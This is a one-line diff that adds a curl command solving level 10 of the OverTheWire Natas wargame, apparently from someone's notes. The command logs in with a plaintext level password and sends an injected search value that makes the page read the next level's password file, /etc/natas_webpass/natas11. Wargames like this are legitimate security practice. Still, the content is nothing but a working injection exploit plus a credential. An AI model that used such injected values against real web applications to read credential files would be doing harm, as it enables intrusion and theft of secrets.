@@ -1,0 +1,1 @@
+$ curl -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu -s "http://natas10.natas.labs.overthewire.org/?needle=%27%27%20/etc/natas_webpass/natas11" | grep natas11
